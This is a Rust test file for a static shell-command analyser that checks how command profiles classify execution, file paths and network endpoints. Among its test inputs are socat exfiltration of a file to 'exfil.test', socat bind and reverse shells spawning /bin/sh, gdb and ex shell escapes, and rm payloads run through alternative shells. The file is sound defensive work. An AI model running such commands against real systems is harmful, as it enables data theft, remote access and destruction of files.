//! Static graph checks for group C. Source recipes are never executed.
use caushell_graph::{GraphNode, NodeKind, SessionGraph, SessionRead};
use caushell_passes::{
    ComputeEffectiveCwdPass, ExtractEndpointProvenancePass, ExtractExecutionSemanticsPass,
    ExtractPathFactsPass, ExtractPipelineFlowPass, ParseCommandPass, ProjectTopLevelCommandsPass,
    ResolveInvocationPass,
};
use caushell_profile::{ProfileRegistry, load_command_profile_from_str};
use caushell_runner::{PassRunner, RunnerContext, SessionView, StagedSession};
use caushell_types::*;

const PROFILES: [&str; 31] = [
    include_str!("../../caushell-profile/profiles/crash.yaml"),
    include_str!("../../caushell-profile/profiles/emacs.yaml"),
    include_str!("../../caushell-profile/profiles/ex.yaml"),
    include_str!("../../caushell-profile/profiles/ftp.yaml"),
    include_str!("../../caushell-profile/profiles/gdb.yaml"),
    include_str!("../../caushell-profile/profiles/gimp.yaml"),
    include_str!("../../caushell-profile/profiles/ksh.yaml"),
    include_str!("../../caushell-profile/profiles/lftp.yaml"),
    include_str!("../../caushell-profile/profiles/ncftp.yaml"),
    include_str!("../../caushell-profile/profiles/nvim.yaml"),
    include_str!("../../caushell-profile/profiles/pico.yaml"),
    include_str!("../../caushell-profile/profiles/posh.yaml"),
    include_str!("../../caushell-profile/profiles/psftp.yaml"),
    include_str!("../../caushell-profile/profiles/rc.yaml"),
    include_str!("../../caushell-profile/profiles/red.yaml"),
    include_str!("../../caushell-profile/profiles/rlogin.yaml"),
    include_str!("../../caushell-profile/profiles/rtorrent.yaml"),
    include_str!("../../caushell-profile/profiles/run-mailcap.yaml"),
    include_str!("../../caushell-profile/profiles/rview.yaml"),
    include_str!("../../caushell-profile/profiles/rvim.yaml"),
    include_str!("../../caushell-profile/profiles/sash.yaml"),
    include_str!("../../caushell-profile/profiles/sftp.yaml"),
    include_str!("../../caushell-profile/profiles/smbclient.yaml"),
    include_str!("../../caushell-profile/profiles/socat.yaml"),
    include_str!("../../caushell-profile/profiles/sshfs.yaml"),
    include_str!("../../caushell-profile/profiles/view.yaml"),
    include_str!("../../caushell-profile/profiles/vigr.yaml"),
    include_str!("../../caushell-profile/profiles/vimdiff.yaml"),
    include_str!("../../caushell-profile/profiles/vipw.yaml"),
    include_str!("../../caushell-profile/profiles/wireshark.yaml"),
    include_str!("../../caushell-profile/profiles/yash.yaml"),
];

fn registry() -> ProfileRegistry {
    let mut profiles: Vec<_> = PROFILES
        .iter()
        .map(|source| load_command_profile_from_str(source).unwrap())
        .collect();
    profiles.push(
        load_command_profile_from_str(include_str!("../../caushell-profile/profiles/echo.yaml"))
            .unwrap(),
    );
    ProfileRegistry::from_profiles(profiles).unwrap()
}

fn graph(command: &str) -> Vec<GraphNode> {
    let mut runner = PassRunner::new();
    runner.register_request_transform_pass(ParseCommandPass);
    runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
    runner.register_session_transform_pass(ResolveInvocationPass::new(registry()));
    runner.register_session_transform_pass(ComputeEffectiveCwdPass);
    runner.register_session_transform_pass(ExtractPipelineFlowPass);
    runner.register_session_transform_pass(ExtractPathFactsPass);
    runner.register_session_transform_pass(ExtractExecutionSemanticsPass);
    runner.register_session_transform_pass(ExtractEndpointProvenancePass);
    let base = SessionGraph::new();
    let summary = SessionSummary::new();
    let mut context = RunnerContext::new(CheckRequest {
        session_id: SessionId::new("gtfo97-c-static"),
        sequence_no: CommandSequenceNo::new(1),
        command: command.into(),
        shell_state_before: ShellStateSnapshot::new("/tmp"),
        shell_kind: ShellKind::Bash,
        home: Some("/home/test".into()),
        workspace_root: Some("/tmp".into()),
        runtime: RuntimeMetadata {
            runtime_name: "static-isolated-acceptance".into(),
            tool_name: Some("Bash".into()),
            shell_runtime_capabilities: ShellRuntimeCapabilities::persistent_shell(),
        },
    });
    runner.run(SessionView::new(&base, &summary), &mut context);
    StagedSession::new(
        &base,
        context.request(),
        &summary,
        context.pending_mutations(),
    )
    .graph()
    .nodes()
    .cloned()
    .collect()
}

fn semantics(command: &str) -> Vec<ExecutionSemantics> {
    graph(command)
        .iter()
        .filter_map(|node| match &node.kind {
            NodeKind::ExecutionSemantics { semantics, .. } => Some(semantics.clone()),
            _ => None,
        })
        .collect()
}

fn semantic(command: &str, name: &str) -> ExecutionSemantics {
    semantics(command)
        .into_iter()
        .find(|item| item.normalized_command_name == name)
        .unwrap_or_else(|| {
            panic!(
                "missing {name} semantics for {command}: {:#?}",
                graph(command)
            )
        })
}

fn has_path(command: &str, expected: &str, role: ResolvedPathRole) -> bool {
    graph(command).iter().any(|node| matches!(&node.kind, NodeKind::PathFact { role: actual, resolution, .. } if *actual == role && resolution.concrete_path() == Some(expected)))
}

#[test]
fn ftp_sftp_and_native_language_values_do_not_create_shell_children() {
    for (command, name) in [
        ("ftp -a example.test", "ftp"),
        ("sftp user@example.test", "sftp"),
        ("ex -c ':!/bin/sh'", "ex"),
        ("gdb -nx -ex '!/bin/sh' -ex quit", "gdb"),
    ] {
        let facts = semantics(command);
        assert_eq!(
            facts
                .iter()
                .map(|f| f.normalized_command_name.as_str())
                .collect::<Vec<_>>(),
            [name],
            "{command}: {facts:#?}"
        );
    }
}

#[test]
fn gdb_information_exit_does_not_create_payload_execution() {
    let facts = semantics("gdb --help -ex 'shell id'");
    assert_eq!(
        facts
            .iter()
            .map(|f| f.normalized_command_name.as_str())
            .collect::<Vec<_>>(),
        ["gdb"],
        "{facts:#?}"
    );
    assert!(
        !facts
            .iter()
            .any(|f| f.executes_payload || f.dispatches_child_command),
        "{facts:#?}"
    );
    assert!(!facts[0].operation_semantics_unresolved, "{facts:#?}");
}

#[test]
fn editor_operands_and_socat_paths_keep_their_effect_roles() {
    assert!(has_path(
        "nvim /tmp/input",
        "/tmp/input",
        ResolvedPathRole::Read
    ));
    assert!(has_path(
        "socat -u file:/tmp/input -",
        "/tmp/input",
        ResolvedPathRole::Read
    ));
    assert!(has_path(
        "socat -u 'exec:echo DATA' open:/tmp/output,creat",
        "/tmp/output",
        ResolvedPathRole::Write
    ));
    let facts = semantics("socat -u 'exec:echo DATA' open:/tmp/output,creat");
    assert!(
        facts.iter().any(|f| f.normalized_command_name == "echo"),
        "{facts:#?}"
    );
}

#[test]
fn socat_transfer_direction_and_listener_role_follow_the_native_address_order() {
    let upload = "socat -u file:/tmp/sensitive tcp-connect:exfil.test:12345";
    assert!(
        has_path(upload, "/tmp/sensitive", ResolvedPathRole::Read),
        "{:#?}",
        graph(upload)
    );
    assert!(
        !has_path(upload, "/tmp/sensitive", ResolvedPathRole::Write),
        "{:#?}",
        graph(upload)
    );
    assert!(graph(upload).iter().any(|node| matches!(&node.kind, NodeKind::ProvenanceArtifact { artifact: ProvenanceArtifact::NetworkEndpoint { endpoint, usage: ProvenanceEndpointUsage::UploadTarget, .. } } if endpoint.contains("exfil.test"))), "{:#?}", graph(upload));

    let reverse_file = "socat -U file:/tmp/received tcp-connect:source.test:12345";
    assert!(
        has_path(reverse_file, "/tmp/received", ResolvedPathRole::Write),
        "{:#?}",
        graph(reverse_file)
    );
    assert!(
        !has_path(reverse_file, "/tmp/received", ResolvedPathRole::Read),
        "{:#?}",
        graph(reverse_file)
    );
    assert!(graph(reverse_file).iter().any(|node| matches!(&node.kind, NodeKind::ProvenanceArtifact { artifact: ProvenanceArtifact::NetworkEndpoint { endpoint, usage: ProvenanceEndpointUsage::FetchSource, .. } } if endpoint.contains("source.test"))), "{:#?}", graph(reverse_file));

    let download = "socat -u tcp-connect:source.test:12345 open:/tmp/downloaded,creat";
    assert!(
        has_path(download, "/tmp/downloaded", ResolvedPathRole::Write),
        "{:#?}",
        graph(download)
    );
    assert!(
        !has_path(download, "/tmp/downloaded", ResolvedPathRole::Read),
        "{:#?}",
        graph(download)
    );
    assert!(graph(download).iter().any(|node| matches!(&node.kind, NodeKind::ProvenanceArtifact { artifact: ProvenanceArtifact::NetworkEndpoint { endpoint, usage: ProvenanceEndpointUsage::FetchSource, .. } } if endpoint.contains("source.test"))), "{:#?}", graph(download));

    let listener =
        "socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane";
    assert!(
        !semantic(listener, "socat").network_listeners.is_empty(),
        "{:#?}",
        graph(listener)
    );
    let reverse =
        semantics("socat tcp-connect:remote.test:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane");
    assert!(
        reverse
            .iter()
            .any(|fact| fact.normalized_command_name == "socat" && fact.dispatches_child_command),
        "{reverse:#?}"
    );
}

#[test]
fn helper_and_startup_config_execution_are_visible_without_shell_inference() {
    let helper = semantic(
        "sshfs -o ssh_command=/path/to/command x: /path/to/dir/",
        "sshfs",
    );
    assert!(helper.executes_payload, "{helper:#?}");
    assert!(!helper.dispatches_child_command, "{helper:#?}");
    assert!(
        has_path(
            "sshfs -o ssh_command=/path/to/command x: /path/to/dir/",
            "/path/to/command",
            ResolvedPathRole::Read
        ),
        "{:#?}",
        graph("sshfs -o ssh_command=/path/to/command x: /path/to/dir/")
    );
    let ordinary_option = semantics("sshfs -o reconnect x: /path/to/dir/");
    assert!(
        ordinary_option
            .iter()
            .any(|f| f.normalized_command_name == "sshfs"
                && !f.executes_payload
                && !f.dispatches_child_command),
        "{ordinary_option:#?}"
    );
    assert!(
        !has_path(
            "sshfs -o reconnect x: /path/to/dir/",
            "reconnect",
            ResolvedPathRole::Read
        ),
        "{:#?}",
        graph("sshfs -o reconnect x: /path/to/dir/")
    );

    let torrent = semantic("rtorrent", "rtorrent");
    assert!(torrent.loads_tool_config, "{torrent:#?}");
    assert!(torrent.executes_config_defined_task, "{torrent:#?}");

    let capture = semantic("wireshark -c 1 -i lo -k -f 'udp port 12345'", "wireshark");
    assert!(!capture.operation_semantics_unresolved, "{capture:#?}");
    assert!(capture.executes_payload, "{capture:#?}");
    assert!(capture.opens_interactive_escape_surface, "{capture:#?}");
    assert!(
        capture.interactive_escape_capabilities.is_empty(),
        "{capture:#?}"
    );

    assert!(
        has_path(
            "run-mailcap view application/octet-stream:/opt/shared/report",
            "/opt/shared/report",
            ResolvedPathRole::Read
        ),
        "{:#?}",
        graph("run-mailcap view application/octet-stream:/opt/shared/report")
    );
}

#[test]
fn noninteractive_foreign_shell_payloads_are_execution_not_ui_or_shell_children() {
    for (command, expected_path) in [
        ("posh -c 'rm /opt/shared/victim'", None),
        ("rc -c 'rm /opt/shared/victim'", None),
        ("sash -c 'rm /opt/shared/victim'", None),
        ("yash -c 'rm /opt/shared/victim'", None),
        ("posh /opt/shared/script", Some("/opt/shared/script")),
        ("rc /opt/shared/script", Some("/opt/shared/script")),
        ("sash -f /opt/shared/script", Some("/opt/shared/script")),
        ("yash /opt/shared/script", Some("/opt/shared/script")),
        ("ksh /opt/shared/script", Some("/opt/shared/script")),
    ] {
        let facts = semantics(command);
        assert_eq!(facts.len(), 1, "{command}: {facts:#?}");
        assert!(facts[0].executes_payload, "{command}: {facts:#?}");
        assert!(
            !facts[0].opens_interactive_escape_surface,
            "{command}: {facts:#?}"
        );
        assert!(!facts[0].dispatches_child_command, "{command}: {facts:#?}");
        if let Some(path) = expected_path {
            assert!(
                has_path(command, path, ResolvedPathRole::Read),
                "{command}: {:#?}",
                graph(command)
            );
        }
    }
}

#[test]
fn system_editor_profiles_retain_database_write_targets() {
    assert!(has_path("vipw", "/etc/passwd", ResolvedPathRole::Write));
    assert!(has_path("vipw -s", "/etc/shadow", ResolvedPathRole::Write));
    assert!(has_path("vigr", "/etc/group", ResolvedPathRole::Write));
    assert!(has_path("vigr -s", "/etc/gshadow", ResolvedPathRole::Write));
    assert!(
        !has_path("pico -s /bin/sh", "/bin/sh", ResolvedPathRole::Write),
        "{:#?}",
        graph("pico -s /bin/sh")
    );
}
